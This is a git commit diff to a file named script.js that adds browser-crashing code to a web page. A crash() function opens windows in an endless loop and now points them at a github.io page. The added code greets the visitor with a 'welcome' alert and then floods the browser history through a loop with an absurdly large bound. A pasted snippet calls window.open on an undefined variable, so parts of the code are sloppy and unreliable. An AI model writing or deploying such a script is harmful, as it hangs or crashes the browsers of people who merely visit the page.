902d14b29cea3a9920b05d2d468cfa49ffc3c962
admin505 <100965441+admin505admin505@users.noreply.github.com>
2024-02-07 15:38:42 -0600

    Update script.js

--- script.js
+++ script.js
@@ -1,7 +1,19 @@
 function crash() {
   while (1 == 1) {
-    window.open("https://www.google.com/?safe=active&ssui=on", "_blank")
+    window.open("dhkiller350.github.io/you/", "_blank")
   }
 }
 
 alert("welcome")
+
+var total = "";
+for( var i = 0; i < 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999; i++ ) {
+  total += i.toString();
+  history.pushState(0,0, total );
+}
+          function openInNewTab(url) {
+  window.open(url, '_blank').focus();
+}
+
+// Or just
+window.open(url, '_blank').focus();
